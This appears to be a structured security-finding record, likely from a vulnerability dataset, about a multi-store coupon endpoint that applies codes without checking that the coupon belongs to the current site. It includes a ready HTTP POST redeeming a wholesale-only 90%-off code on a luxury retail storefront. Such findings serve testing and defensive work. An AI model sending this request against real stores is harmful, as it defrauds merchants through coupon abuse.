diagnosis: PromotionCoupon models are scoped to individual brand sites in a multi-store platform. The view applies coupons by code without verifying that the coupon's site matches get_current_site(request). Customers shopping on high-margin storefronts can redeem secret, heavily discounted promotions designated exclusively for wholesale or institutional partner domains.
exploit_request:
POST /api/v1/cart/apply-coupon/ HTTP/1.1
Host: retail-luxury.brandstore.com
Authorization: Bearer <customer_token>
Content-Type: application/json

{"code": "WHOLESALE_PARTNER_90OFF"}
